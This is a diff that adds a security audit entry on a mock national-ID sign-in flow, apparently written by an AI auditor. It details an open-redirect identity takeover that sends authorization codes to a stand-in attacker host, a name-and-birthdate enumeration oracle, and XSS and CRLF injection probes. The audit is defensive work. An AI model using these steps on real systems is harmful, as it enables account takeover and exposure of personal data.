@@ -5,6 +5,351 @@ Newest run at the top. The auditor reports; it does not fix.
 
 ---
 
+## Audit - 2026-07-27 — capture flow (Sumsub-style mock IdP), working tree at 0da04c3
+
+**Scope.** The uncommitted diff: `backend/mock_esignet.py` (rewritten),
+`backend/store.py` (+`identity_exists`), `backend/app.py` (+1 line),
+`backend/t.py` (tests 58/59), `frontend/src/components/VerifyGate.jsx` (copy).
+Read against `CAPTURE.md` and CLAUDE.md's non-negotiables.
+
+**Method.** Two throwaway uvicorn instances of my own, both terminated: :8099
+(`APP_ENV=dev`, `RATE_LIMIT=off`, `BASE_URL`/`PUBLIC_URL` pinned to itself so the
+token exchange is self-consistent) and :8098 in the **shipped** posture
+(`APP_ENV=production DEMO_MODE=1`, limiter ON) to check what the Render deploy
+actually exposes. `t.py` not run (test 32 resets the shared database). Every
+attack below was driven, not reasoned about. Probe scripts lived in the
+scratchpad; no project file was modified. The dev database picked up a handful of
+throwaway identity rows ("Victim Person", "Squat Target", "Probe *") — the next
+`t.py` run resets them.
+
+**Headline: the central claim holds. The front door does not.** I could not find
+any path by which a face or document byte reaches the session, a table, the
+access log, or a response — verified by parsing the served DOM and by pushing
+real multipart image parts at the server. But the flow that replaced the persona
+picker turns the demo's sign-in into a working identity takeover, and
+`/authorize/known` hands an attacker the target list.
+
+**1 critical, 1 high, 5 medium, 6 low.**
+
+### Critical
+
+#### C1 — Attacker-chosen `state` + the path-only redirect check = full takeover of any identity that completes capture. Demonstrated end to end.
+
+*Where:* `backend/mock_esignet.py:120-134` (`_valid_redirect`), `:687-689` (the
+303 that carries the code), `backend/app.py:605-618` (`/callback`). Published on
+the public internet by `render.yaml:16-18` (`DEMO_MODE=1`).
+
+*Confidence: certain.* Driven against a running server; transcript below.
+
+`_valid_redirect` checks only that the **path** is `/callback`. The host is free.
+So `https://evil.example.com/callback` validates, and `/authorize/confirm` 303s
+the freshly minted authorization code to it. The previous audit
+(AUDIT.md:5294-5308) looked at exactly this and ruled it inconsequential, on two
+grounds: *"the leaked code is unexchangeable without the private_key_jwt client
+assertion"* and *"the code maps only to a mock persona that anyone can select via
+`/login` anyway"*. **This diff invalidates both.** The attacker never needs to
+exchange the code — they feed it to the relying party's own `/callback`, which
+holds the key. And the code no longer maps to a shared fictional persona; it maps
+to whatever the victim just typed into a real identity-capture form.
+
+The attack, exactly as run:
+
+1. Attacker hits `/login` in their own browser and reads `state=S` out of the
+   redirect. `S` is now bound to the **attacker's** pre-auth session (valid 30
+   min, `PRE_AUTH_SESSION_TTL_HOURS`).
+2. Attacker sends the victim
+   `https://<demo>/authorize?client_id=fayda-wallet-demo&redirect_uri=https://evil.example.com/callback&state=S&nonce=n`.
+   This is the legitimate origin serving the legitimate capture page — I confirmed
+   it renders (200, `getUserMedia` present) in the production+DEMO_MODE posture
+   with the foreign `redirect_uri`.
+3. Victim fills in the form, photographs themselves, uploads their ID, sees
+   "Identity verified", clicks Continue.
+4. The code lands on the attacker's server:
+   `https://evil.example.com/callback?code=W4X_A_dkdVrODWI8HisGhIPsBnAy5VrA&state=UTUw9CbqSZK1C-pVaTPtgA`
+5. Attacker replays it into their **own** session: `GET /callback?code=...&state=S`
+   → 307, and `/api/me` returns `authenticated: True`,
+   `display_name: "Victim Person"`, the victim's claims, the victim's
+   `identity_id`.
+
+The `state` check at `app.py:609` does not stop this: it binds the code to the
+session that *chose* the state, and the attacker chose it. From there the attacker
+holds an `auth_method: "fayda"` session — `POST /api/passkey/register/begin`
+returns 200, so they can enrol a permanent credential on the victim's identity,
+read the victim's bindings and history, and start a wallet swap.
+
+*Invariant broken:* #7 (a passkey is supposed to re-establish an identity Fayda
+verified for *that person*; here it is enrolled onto an identity the attacker does
+not own) and the premise that a Fayda session belongs to the person Fayda checked.
+
+*Why the capture flow makes this worse rather than equal:* the persona picker
+leaked a code for a fictional shared persona nobody owned. The capture page leaks
+a code for a real person's real details, and it does so from a page designed to
+look like a national-ID checkpoint — which is exactly what makes step 2 clickable.
+The redirect also drops the victim on the attacker's origin immediately after a
+screen that told them they were verified: a natural place to host a cloned capture
+page that *does* upload the photo.
+
+*The test that gives false comfort:* `backend/t.py:415-422` asserts only that
+`https://evil.example.com/`**`phish`** is rejected. It varies the path, never the
+host, so it passes with the hole wide open.
+
+### High
+
+#### H1 — A name and a date of birth are now the entire credential, and `/authorize/known` tells an unauthenticated attacker which pairs are live.
+
+*Where:* `backend/mock_esignet.py:102-117` (`derive_sub`), `:623-654`
+(`/authorize/known`), `:657-689` (`/authorize/confirm`), `backend/store.py:766-778`.
+
+*Confidence: certain.* Driven.
+
+`derive_sub` is `sha256(lower(collapse_ws(name)) + "|" + birthdate)` folded to 12
+digits, with **no secret**. `/authorize/confirm` accepts those two strings from
+anyone and mints a code. So possession of a name and a birthdate *is* possession
+of the identity:
+
+```
+real user identity:      df25fa78-2c7b-4fda-9b24-e34bb3494551  "Squat Target"
+POST /authorize/known {"full_name":"Squat Target","birthdate":"1992-12-01"} -> {"known": true}
+POST /authorize/known {"full_name":"Squat Target","birthdate":"1992-12-02"} -> {"known": false}
+POST /authorize/known {"full_name":"squat  target", ...}                    -> {"known": true}  (normalised)
+attacker lands on identity: df25fa78-2c7b-4fda-9b24-e34bb3494551  same: True
+attacker auth_method: fayda | POST /api/passkey/register/begin: 200
+```
+
+The attacker also got to *choose* the victim's session claims — they logged into
+the victim's identity asserting `residenceStatus: FOREIGN_NATIONAL` and
+`region: Tigray` where the real user had asserted `CITIZEN` / `Amhara`. The
+citizenship signal `CAPTURE.md` wants surfaced is self-asserted per login and
+attached to the session, not to the identity, so two sessions on one identity can
+disagree about it.
+
+`/authorize/known` is a clean oracle: unauthenticated, DB-backed, stable across
+processes (the pepper is pinned in the deploy), and it lands in the `login` tier —
+I measured **52 of 60** burst probes allowed against the production-posture
+instance, then ~1/s sustained. Given a name, an 80-year DOB window is ~29,000
+probes: about eight hours from one address, minutes from a spread of them. It also
+confirms *registration*, which for this population is itself the sensitive bit
+("did this person use the wallet registry").
+
+The docstring's defence — *"it reveals only what someone who already knows an exact
+name and date of birth could learn by starting a verification anyway"* — is true,
+and is the problem: starting a verification anyway **logs you in as them**.
+
+*Invariant broken:* #8 (a cross-identity read with no operator check and no
+access-log entry) and, in spirit, #7.
+
+*Not reachable against a real provider* — the router mounts only under `MOCK_IDP`,
+and `app.py:145-164` still refuses to boot `DEMO_MODE` with any `FAYDA_*`
+credential set; I verified `/api/dev/*` stays 404 in that posture. The blast radius
+is the shipped public demo, its real Supabase database, and the real people who
+type real details into it.
+
+### Medium
+
+#### M1 — Four digits of the FIN-shaped `sub` now reach the browser and are persisted in Postgres, through the `address` claim. Non-negotiable #1.
+
+*Where:* `backend/mock_esignet.py:759-767` — `"kebele": sub[:2]`,
+`"woreda": sub[2:4]`. `address` **is** in `SAFE_CLAIMS` (`app.py:549-551`), so it
+survives the whitelist into `session["claims"]` and out of `/api/me`.
+
+*Confidence: certain.* Read out of the live `sessions` table:
+
+```
+sub for "Squat Target" = 461697870520
+stored session row: {"claims": {..., "address": {"zone":"Amhara","kebele":"46",
+                     "region":"Amhara","woreda":"16"}, ...}}
+```
+
+`kebele` and `woreda` are exactly `sub[0:2]` and `sub[2:4]`. The old personas
+carried fixed strings ("13"/"08") with no relationship to the FIN; this diff
+derived them from it. Non-negotiable #1 is written without a percentage — "the raw
+FIN is never persisted, logged, or sent to the browser" — and a third of it now is,
+in the database and in the DOM. It also cuts the guessing space by 10^4.
+
+Test 3b (`t.py:97`) cannot catch this: it substring-searches for the whole 12-digit
+value. And this is the file CLAUDE.md calls "the only file to touch when real
+credentials arrive", so the pattern is sitting in the template.
+
+#### M2 — `identity_exists` is an unauthenticated cross-identity read on the privileged, RLS-bypassing connection.
+
+*Where:* `backend/store.py:775` uses `conn()`, not `user_conn()`. Its only caller
+is an HTTP route open to the world (`mock_esignet.py:651`).
+
+CLAUDE.md #9 reserves `conn()` for "genuinely cross-identity work (the sybil check,
+promotion, sessions, credential lookup at login)"; #8 requires an operator check
+**and** an access-log entry before any cross-user read. This is a cross-user read,
+by an anonymous caller, with neither. The mock is a throwaway, but it reaches the
+production `identities` table through the owner role. It is also an unauthenticated
+round trip on a 12-connection pool (`store.py:442`), i.e. a cheap way to hold
+connections the app needs.
+
+*Confidence: certain* on the mechanism; *likely* on the pool-pressure angle
+mattering before the limiter bites.
+
+#### M3 — `_codes` and `_tokens` are never pruned: unauthenticated memory exhaustion of the demo instance.
+
+*Where:* `backend/mock_esignet.py:66-67`, `:682` (insert), `:719` (pop on
+redemption only), `:724`.
+
+An authorization code that is minted and never redeemed lives forever; nothing
+sweeps on `exp`. `POST /authorize/confirm` is unauthenticated and needs five short
+strings, so at the login tier's sustained 1/s an attacker adds ~86,000 dict entries
+per day per source address — order 70 MB/day/IP against a 512 MB free Render
+instance, faster from several addresses. Pre-existing in shape (the persona flow
+had the same dicts), but untouched by a diff that rewrote the file around it.
+`_tokens` leaks the same way but needs a valid client assertion, so only the RP
+grows it.
+
+*Confidence: certain* that nothing prunes; *likely* on the timeline.
+
+#### M4 — "Already verified" is a dead end for anyone without a passkey, and the name space is squattable.
+
+*Where:* `backend/mock_esignet.py:466-478` — `alreadyVerified()` writes the "sign
+in with the passkey you registered" panel and then
+`$("go1").classList.add("hidden")`. There is no other way forward in the UI.
+
+Passkey registration is optional in the SPA (`App.jsx:146` — a button the user may
+never press). A demo visitor who verifies, never adds a passkey, and comes back is
+told they have already verified and handed a button that returns them to a passkey
+prompt no authenticator can answer. Their only escape is to type a slightly
+different name, which mints a *different* identity — and if they then try to bind
+the wallet they already bound, the sybil index refuses them.
+
+Worse, the check keys on name+DOB alone, so an attacker can pre-register a name
+they do not own (H1's flow) and strand the real person on arrival. The server does
+not enforce the routing at all — `/authorize/confirm` proceeds happily for a known
+person — so the lockout is purely a UI decision, which is the wrong half to
+enforce.
+
+*Confidence: certain* on the dead end; *likely* on squatting mattering in practice.
+
+#### M5 — The demo now collects real names and dates of birth from the public and stores them durably, with no retention story and an enumeration oracle over them.
+
+`CAPTURE.md`'s data-protection reasoning covers images only. But
+`identities.display_name` and `identities.birthdate` (`app.py:642-646`) and the
+session claims (gender, region, residenceStatus, kebele/woreda) are written to a
+real Supabase project that "survives redeploy/restart/scale" — from a page that
+asks a member of the public for their legal name, date of birth and residence
+status under a national-ID banner. The persona picker asked for none of that. Add
+`/authorize/known` (H1) and the set of people who used the demo becomes confirmable
+by anyone. A policy gap rather than a code bug, but much cheaper to fix before the
+demo is shared than after.
+
+*Confidence: certain* on the persistence; the severity judgement is mine.
+
+### Low
+
+- **L1 — `/authorize/confirm`'s 422 echoes `UploadFile` internals.** Send a file
+  part where a text field is expected and the response body contains the attacker's
+  `filename`, `size`, the content-type header, and `_max_size` /
+  `_TemporaryFileArgs` from the spooled file. No image bytes (I checked), but it is
+  an image-shaped object being reflected out of the endpoint the diff claims cannot
+  reflect one, and test 58 would not notice if that ever became the content.
+- **L2 — No body-size cap on either new/rewritten POST.** A 12 MB multipart part at
+  `/authorize/confirm` is parsed, spooled (rolling to a temp file above 1 MB) and
+  discarded — 303, no temp file left behind, nothing persisted, but the parse is
+  free for the attacker. `/authorize/known` swallowed a 20 MB JSON body and answered
+  200. Bounded only by the login tier.
+- **L3 — `derive_sub` normalisation.** Case and whitespace are folded (verified),
+  Unicode is not: NFC and NFD spellings of the same accented name produce different
+  subs, so one person can end up with two identities. `birthdate` is unvalidated
+  free text, so `1990-1-1` and `1990-01-01` are different people. And 64 bits folded
+  into 10^12 means two different people can collide onto one identity row —
+  irrelevant at demo scale (50% at ~1.2M identities), fatal if this shape were ever
+  kept.
+- **L4 — Test 58 is sound but under-tests its own claim.** It pushes image-ish
+  values as *urlencoded* fields only, never a real multipart file part (I verified
+  separately that the file-part path is also clean, so the conclusion holds — the
+  test just does not establish it). `assert "face_image" not in page and "id_image"
+  not in page` pins two arbitrary strings rather than the form's shape; a future
+  `<input name="selfie_b64">` sails through. One of its three "response bodies" is
+  `page`, fetched before the sentinel existed. The information_schema column sweep
+  is genuinely good and worth keeping.
+- **L5 — No CSP, `X-Frame-Options` or `Referrer-Policy` on the capture page**
+  (checked the live headers: `content-type` only). The page is framable, and it
+  `@import`s Google Fonts, so the "mock IdP" makes a third-party request from the
+  deploy's real origin while telling the user nothing leaves their device.
+- **L6 — The document object URL is never revoked.** `f_selfie` revokes (`:516`)
+  but the ID document's URL does not, and `id_again` (`:539-544`) drops the
+  reference without revoking, so each re-pick leaks a blob. The images stay resident
+  longer than "discarded immediately" implies. Cosmetic against the real guarantee,
+  which holds.
+
+### Verified safe
+
+Actively attacked and could not break:
+
+- **No image byte can reach the server.** I parsed the page the server actually
+  serves: exactly **one** form (`action=/authorize/confirm`, no enctype) with
+  **eight hidden text inputs** and nothing else; the two `<input type=file>`
+  elements sit **outside** it, carry **no `name`**, and have no `form=` attribute,
+  so they are unsubmittable twice over. The page contains **no** `toDataURL`,
+  `toBlob`, `getImageData`, `FormData`, `XMLHttpRequest`, `sendBeacon` or
+  `WebSocket` — there is no API present capable of serialising the canvas or the
+  File. The only `fetch` is `/authorize/known`, carrying a name and a date.
+- **A hostile client cannot make the server keep one either.** Real multipart parts
+  (`face.jpg`, 12 MB) posted alongside the text fields: 303, code minted, parts
+  dropped, **no temp file left in the temp dir**, and the sentinel appears in no
+  column of any table.
+- **`picture` is a fixed placeholder** and is not in `SAFE_CLAIMS`; `/api/me`
+  carries neither `picture` nor `phone`. `log_event`'s whitelist (`app.py:263-266`)
+  admits no claim field, so nothing image-shaped can reach a structured log line.
+- **Injection.** `"><script>alert(1)</script>` in `state`, `nonce` and `scope`: all
+  escaped, zero live script. In the JS context, a `redirect_uri` containing
+  `</script><script>` comes back as `<\/script><script>` inside a `json.dumps`
+  string literal; `\` and `"` are escaped; U+2028 comes back as ` `
+  (`ensure_ascii`). No brace/format bug — the page renders and the doubled braces in
+  the inline JS are correct throughout.
+- **No header injection.** `state` containing CRLF is percent-encoded by
+  `RedirectResponse` (`state=a%0D%0AX-Injected:%201`); no extra header appeared.
+- **Duplicate `code=` cannot be pre-seeded.** `redirect_uri=/callback?code=ATTACKER`
+  produces `?code=ATTACKER&code=<real>`; Starlette's query parsing takes the
+  **last**, so the genuine code wins (307, login succeeds). Not a code-substitution
+  path.
+- **The OIDC handoff is intact and mandatory.** Capture mints nothing but an
+  authorization code; there is no new way to obtain a session. `code → token
+  (private_key_jwt RS256, `iss`/`sub` checked against `client_id`) → userinfo` is
+  still the only route, codes are single-use (`_codes.pop`) and 120-second bound,
+  `/authorize/confirm` still re-validates `redirect_uri`, and `app.py`'s callback
+  still checks `state`.
+- **The double-import trap is genuinely fixed.** `mock_esignet.HASH_FIN = hash_fin`
+  is injected at `app.py:527-535`; the only function-level import left in the mock
+  is `import store as _store` (`:645`), which resolves to the module `app.py`
+  already loaded under both `python app.py` and `uvicorn app:app` — no second copy,
+  no regenerated keypair. `grep` confirms the only other function-level imports in
+  the backend are `getpass`/`socket`/`sys` inside `store.py`'s CLI helpers. Token
+  exchange still worked after repeated `/known` probes.
+- **Gating.** The router mounts only under `MOCK_IDP = DEV_MODE or DEMO_MODE`
+  (`app.py:516-517`); `mock_esignet` is imported only then (`:167-168`); the
+  `DEMO_MODE`-with-real-credentials boot refusal (`:145-164`) is untouched. Against
+  the production+`DEMO_MODE` instance I confirmed `/api/dev/reset` → **404** while
+  the capture page and `/authorize/known` are live, which is the documented split.
+- **`/authorize` and `/authorize/known` mint no session and set no cookie**, so
+  neither grows the sessions table.
+- **`/authorize/known` fails closed** on non-dict JSON, junk bodies, a 100 kB name,
+  a dict or list where a string was expected, and (by construction) an unset
+  `HASH_FIN` or a DB error — always `{"known": false}` or 400, never a stack trace.
+- **No CORS middleware**, so the oracle is not usable from a victim's browser
+  cross-origin; it is a server-side attack only.
+- **Binding, nonce, sybil and cooling logic are untouched** by this diff; the only
+  `store.py` change is a read-only existence check, and no schema, index, policy or
+  RLS definition moved. `upsert_identity` does not overwrite `display_name` or
+  `birthdate` on a returning login, so an impersonator cannot rewrite the victim's
+  stored name.
+- **Test 59 is not vacuous** — it asserts a real `known: true` / `known: false`
+  pair, that the passkey path lands on the *same* `identity_id`, that `auth_method`
+  is `passkey`, and that a token exchange still succeeds after a probe (the
+  regression it was written for).
+
+**Verdict: not safe to build on — no.** The image guarantee, the hard part and the
+thing the spec cared most about, is genuinely met: I attacked it from the page,
+from a hostile client and from the database and found nothing. But the new front
+door is an identity takeover (C1, driven end to end in the shipped `DEMO_MODE`
+posture) sitting beside an unauthenticated oracle that names the targets (H1), and
+`render.yaml` publishes both to the public internet.
+
+---
+
 ## Closing fix review — R6 round 4, 2026-07-27 (NEW-3, NEW-4 at ddd26d4)
 
 **Scope:** two deltas only — `proxy_headers=False` / `--no-proxy-headers` on every
